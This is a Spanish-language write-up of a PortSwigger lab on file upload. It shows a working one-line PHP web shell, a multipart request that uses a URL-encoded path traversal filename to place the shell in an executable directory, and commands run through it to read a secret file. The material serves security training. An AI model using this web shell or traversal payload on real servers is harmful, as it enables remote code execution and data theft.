---
title: "Web shell upload via path traversal"
description: "Laboratorio de Portswigger sobre File Upload"
date: 2024-11-25 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - File Upload
tags:
  - Portswigger Labs
  - File Upload
  - Web shell upload via path traversal
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, el servidor está configurado para `prevenir` la `ejecución` de `archivos` proporcionados por el usuario, pero esta restricción puede ser eludida explotando un `path traversal`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Lab-3/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Lab-3/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Lab-3/image_3.png)

Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Lab-3/image_4.png)

Nos creamos un archivo llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se aloja en `/files/avatars`

![](/assets/img/File-Upload-Lab-3/image_5.png)

Si accedemos a `https://0af3002604e2eaaa825ad87900e80024.web-security-academy.net/files/avatars/shell.php` vemos que `no` se está `interpretando`

![](/assets/img/File-Upload-Lab-3/image_6.png)

Al parecer los archivos `php` de este directorio `no` se `interpretan`, lo que debemos hacer es `subir` el `archivo` nuevamente y `capturar` la `petición` con `Burpsuite`. Una vez hecho esto vamos a efectuar un path traversal `filename="%2e%2e%2fshell.php"`, este payload es `../shell.php` pero tenemos que `url encodearlo` porque nos elimina el `../`

```
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fshell.php"
Content-Type: application/x-php

<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Si accedemos a `https://0a4700a403b7d67580dde9b000e30030.web-security-academy.net/files/shell.php?cmd=whoami` veremos que hemos logrado un `RCE (Remote Code Execution)` debido a que el `path traversal` ha sido exitoso y el directorio `/files` no tenía `ninguna restricción` a la hora de `interpretar` archivo `php`

![](/assets/img/File-Upload-Lab-3/image_7.png)

`Listamos` el `contenido` de la `home` de carlos `https://0a4700a403b7d67580dde9b000e30030.web-security-academy.net/files/shell.php?cmd=ls%20/home/carlos`

![](/assets/img/File-Upload-Lab-3/image_8.png)

Obtenemos el contenido del archivo secret `https://0a4700a403b7d67580dde9b000e30030.web-security-academy.net/files/shell.php?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Lab-3/image_9.png)

`Submiteamos` la `solución`

![](/assets/img/File-Upload-Lab-3/image_10.png)
